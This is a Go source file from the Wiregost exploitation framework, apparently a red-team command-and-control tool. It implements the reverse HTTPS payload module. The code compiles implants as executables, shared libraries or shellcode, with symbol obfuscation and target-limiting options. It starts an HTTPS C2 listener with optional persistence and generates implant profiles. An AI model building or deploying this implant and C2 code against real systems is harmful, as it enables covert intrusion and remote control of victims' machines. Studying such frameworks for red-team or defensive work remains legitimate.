// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package reverse_https

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/fs"
	"github.com/evilsocket/islazy/tui"

	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseHTTPS - A single stage HTTPS implant
type ReverseHTTPS struct {
	*module.Module
}

// New - Instantiates a reverse HTTPS module, empty.
func New() *ReverseHTTPS {
	mod := &ReverseHTTPS{&module.Module{}}
	mod.Path = []string{"payload/multi/single/reverse_https"}
	return mod
}

var modLog = log.ServerLogger("payload/multi/single/reverse_https", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseHTTPS) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case "run":
		return s.CompileImplant()
	case "to_listener":
		return s.toListener()
	case "parse_profile":
		return s.parseProfile(command)
	case "to_profile":
		return s.generateProfile(command)
	}

	return "", nil
}

func (s *ReverseHTTPS) CompileImplant() (result string, err error) {
	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	go generate.CompileGhost(*c)

	return fmt.Sprintf("Started compiling HTTPS implant"), nil
}

func (s *ReverseHTTPS) toListener() (result string, err error) {
	host := s.Options["LHost"].Value
	portUint, _ := strconv.Atoi(s.Options["LPort"].Value)
	port := uint16(portUint)
	addr := fmt.Sprintf("%s:%d", host, port)
	domain := s.Options["DomainHTTPListener"].Value
	website := s.Options["Website"].Value
	letsEncrypt := false
	if s.Options["LetsEncrypt"].Value == "true" {
		letsEncrypt = true
	}

	certFile, _ := fs.Expand(s.Options["Certificate"].Value)
	keyFile, _ := fs.Expand(s.Options["Key"].Value)
	cert, key, err := getLocalCertificatePair(certFile, keyFile)
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to load local certificate %v", err))
	}

	conf := &c2.HTTPServerConfig{
		Addr:    addr,
		LPort:   port,
		Secure:  true,
		Domain:  domain,
		Website: website,
		Cert:    cert,
		Key:     key,
		ACME:    letsEncrypt,
	}

	server := c2.StartHTTPSListener(conf)
	if server == nil {
		return "", errors.New("HTTP Server instantiation failed")
	}

	// Persistence
	persist := ""
	if s.Options["Persist"].Value == "true" {
		persist = fmt.Sprintf("%s[P]%s ", tui.GREEN, tui.RESET)
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "HTTPS",
		Description: fmt.Sprintf("%sHTTPS C2 server (https for domain %s)", persist, conf.Domain),
		Protocol:    "tcp",
		Port:        port,
		JobCtrl:     make(chan bool),
	}

	core.Jobs.AddJob(job)
	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	// Save persist
	if s.Options["Persist"].Value == "true" {
		err := c2.PersistHTTPS(job, host, certFile, keyFile, conf.Secure, conf.Domain, conf.Website, conf.ACME)
		if err != nil {
			s.ModuleEvent("Error saving persistence: " + err.Error())
		}
	}

	go func() {
		var err error
		if server.Conf.ACME {
			err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
		} else {
			err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
		}
		if err != nil {
			modLog.Errorf("HTTPS listener error %v", err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}

	}()

	go func() {
		<-job.JobCtrl
		once.Do(func() { cleanup(nil) })
	}()

	return fmt.Sprintf("Reverse HTTPS listener started at %s:%d", host, port), nil
}

func (s *ReverseHTTPS) parseProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	profile, err := generate.ProfileByName(profileName)
	if err != nil {
		return "", err
	}

	// C2
	if profile.HTTPc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "https") {
				url := strings.TrimPrefix(d.URL, "https://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsHTTP"].Value = strings.Join(urls, ",")
	}

	// Canaries
	if len(profile.CanaryDomains) != 1 {
		domains := []string{}
		for _, d := range profile.CanaryDomains {
			domains = append(domains, d)
		}
		s.Options["Canaries"].Value = strings.Join(domains, ",")
	}

	// Format
	switch profile.Format {
	case 0:
		s.Options["Format"].Value = "shared"
	case 1:
		s.Options["Format"].Value = "shellcode"
	case 2:
		s.Options["Format"].Value = "exe"
	}

	// Other fields
	s.Options["Arch"].Value = profile.GOARCH
	s.Options["OS"].Value = profile.GOOS
	s.Options["MaxErrors"].Value = strconv.Itoa(profile.MaxConnectionErrors)
	s.Options["ObfuscateSymbols"].Value = strconv.FormatBool(profile.ObfuscateSymbols)
	s.Options["Debug"].Value = strconv.FormatBool(profile.Debug)
	s.Options["LimitHostname"].Value = profile.LimitHostname
	s.Options["LimitUsername"].Value = profile.LimitUsername
	s.Options["LimitDatetime"].Value = profile.LimitDatetime
	s.Options["LimitDomainJoined"].Value = strconv.FormatBool(profile.LimitDomainJoined)
	s.Options["ReconnectInterval"].Value = strconv.Itoa(profile.ReconnectInterval)

	return fmt.Sprintf("Profile %s parsed", profile.Name), nil
}

func (s *ReverseHTTPS) generateProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	// Save profile
	c.Name = profileName
	if 0 < len(c.Name) && c.Name != "." {
		modLog.Infof("Saving new profile with name %#v", c.Name)
		err = generate.ProfileSave(c.Name, c)
	} else {
		err = errors.New("Invalid profile name")
		return "", err
	}

	return fmt.Sprintf("Saved reverse DNS implant profile with name %#v", c.Name), nil
}

func (s *ReverseHTTPS) ToGhostConfig() (c *generate.GhostConfig, err error) {
	c = &generate.GhostConfig{}

	// OS
	targetOS := s.Options["OS"].Value
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}

	// Arch
	arch := s.Options["Arch"].Value
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	// Format
	var outputFormat pb.GhostConfig_OutputFormat
	format := s.Options["Format"].Value
	switch format {
	case "shared":
		outputFormat = pb.GhostConfig_SHARED_LIB
		c.IsSharedLib = true
	case "shellcode":
		outputFormat = pb.GhostConfig_SHELLCODE
		c.IsSharedLib = true
	case "exe":
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	default:
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	}

	// HTTP C2
	c2s := generate.ParseHTTPc2ToStruct(s.Options["DomainsHTTP"].Value)
	if len(c2s) == 0 {
		return nil, errors.New("You must specify at least one HTTPS C2 endpoint")
	}

	// Canary Domains
	canaries := strings.Split(s.Options["Canaries"].Value, ",")
	if canaries[0] != "" {
		c.CanaryDomains = strings.Split(s.Options["Canaries"].Value, ",")
	}

	// Populate fields
	c.GOOS = targetOS
	c.GOARCH = arch
	c.Format = outputFormat
	c.C2 = c2s
	c.HTTPc2Enabled = true
	c.Debug, _ = strconv.ParseBool(s.Options["Debug"].Value)
	c.ObfuscateSymbols, _ = strconv.ParseBool(s.Options["ObfuscateSymbols"].Value)
	c.MaxConnectionErrors, _ = strconv.Atoi(s.Options["MaxErrors"].Value)
	c.ReconnectInterval, _ = strconv.Atoi(s.Options["ReconnectInterval"].Value)
	c.LimitDomainJoined, _ = strconv.ParseBool(s.Options["LimitDomainJoined"].Value)
	c.LimitHostname = s.Options["LimitHostname"].Value
	c.LimitUsername = s.Options["LimitUsername"].Value
	c.LimitDatetime = s.Options["LimitDatetime"].Value

	return c, nil
}
